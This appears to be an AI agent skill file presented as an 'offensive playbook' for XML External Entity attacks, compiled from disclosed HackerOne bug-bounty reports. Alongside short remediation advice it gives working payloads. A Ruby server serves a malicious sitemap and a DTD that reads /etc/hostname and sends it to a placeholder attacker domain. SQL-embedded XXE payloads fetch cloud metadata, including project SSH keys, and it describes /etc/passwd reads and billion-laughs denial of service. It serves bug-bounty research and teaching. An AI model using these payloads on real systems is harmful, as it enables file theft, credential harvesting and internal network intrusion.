---
name: xxe
description: "XML External Entities (XXE) offensive playbook from 12 disclosed HackerOne reports (7 critical, 2 high, 2 medium, 1 low). Use when hunting or reviewing xml external entities (xxe). Triggers: xxe, attacker, xml, injection, file."
license: "For authorized security testing and education only."
---

# XML External Entities (XXE)

> Distilled from **12** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

An XML parser resolves external entities, enabling file read, SSRF, and sometimes RCE or DoS.

## Where to hunt

- Find XML/SVG/DOCX/SAML/SOAP intake; test with a benign external entity and an OAST callback.

## Exploitation playbook

- File read via `SYSTEM "file:///etc/passwd"`; SSRF via `http://` entities; blind XXE with out-of-band DTD.
- Billion-laughs for DoS when reads are blocked.

## Bypass techniques

- Parameter entities and external DTDs to exfiltrate when inline entities are filtered; UTF-16/encoding tricks.

## Impact & escalation

- Local file/secret read, internal SSRF, occasional RCE via expect/parser features.

## Remediation

- Disable DTDs and external entity resolution in every XML parser; prefer non-XML formats.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1156748](https://hackerone.com/reports/1156748)  -  XXE in Enterprise Search's App Search web crawler
*critical*

```ruby
require 'sinatra'

set :bind, '0.0.0.0'

get '/robots.txt' do

  'User-agent: *
Disallow:

sitemap: /sitemap.xml
'
end

get '/sitemap.xml' do
  content_type 'application/xml'

  '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
<!ENTITY % dtd SYSTEM "http://YOURDOMAIN.COM/exfil.dtd">
%dtd;
%param1;
%exfil;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
<url>
    <loc>&test;</loc>
    <lastmod>2019-06-19</lastmod>
    <changefreq>daily</changefreq>
</url>
</urlset>'
end

get '/exfil.dtd' do
  content_type 'application/xml-dtd'

  '<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://YOURDOMAIN.COM/exfil?%data;\'>">'
# … truncated …
```

### 2. [#742808](https://hackerone.com/reports/742808)  -  Non-production Open Database In Combination With XXE Leads To SSRF
*critical*

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

### 3. [#742808](https://hackerone.com/reports/742808)  -  Non-production Open Database In Combination With XXE Leads To SSRF
*critical*

```sql
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```

### 4. [#1156748](https://hackerone.com/reports/1156748)  -  XXE in Enterprise Search's App Search web crawler
*critical*

```http
get '/sitemap.xml' do
```

### 5. [#500515](https://hackerone.com/reports/500515)  -  XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx
*critical*

```http
post the edited request,the starbucks's server will visit the attacker's server to get the DTD file.

## Impact
```

### 6. [#1217114](https://hackerone.com/reports/1217114)  -  CCC H1 June 2021 CTF Writeup
*critical*

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "The espurr purrs"> %ext;
]>
<r></r>
```

More payloads: see [payloads.md](payloads.md) (22 curated).

## Recurring patterns in this dataset

Most frequent terms across the 12 reports (term (count)): `xxe` (12), `attacker` (4), `xml` (4), `injection` (4), `file` (3), `ssrf` (3), `search` (3)

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#347139](https://hackerone.com/reports/347139) | critical | $1,500 | rockstargames | LFI and SSRF via XXE in emblem editor |
| [#500515](https://hackerone.com/reports/500515) | critical |  -  | starbucks | XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx |
| [#483774](https://hackerone.com/reports/483774) | critical |  -  | duckduckgo | XXE on https://duckduckgo.com |
| [#742808](https://hackerone.com/reports/742808) | critical |  -  | evernote | Non-production Open Database In Combination With XXE Leads To SSRF |
| [#1217114](https://hackerone.com/reports/1217114) | critical |  -  | h1-ctf | CCC H1 June 2021 CTF Writeup |
| [#1218708](https://hackerone.com/reports/1218708) | critical |  -  | h1-ctf | HackerOne’s 100K CTF Writeup |
| [#1156748](https://hackerone.com/reports/1156748) | critical |  -  | elastic | XXE in Enterprise Search's App Search web crawler |
| [#486732](https://hackerone.com/reports/486732) | high |  -  | duckduckgo | Partial bypass of #483774 with Blind XXE on https://duckduckgo.com |

*See [reference.md](reference.md) for all 12 reports in this class.*
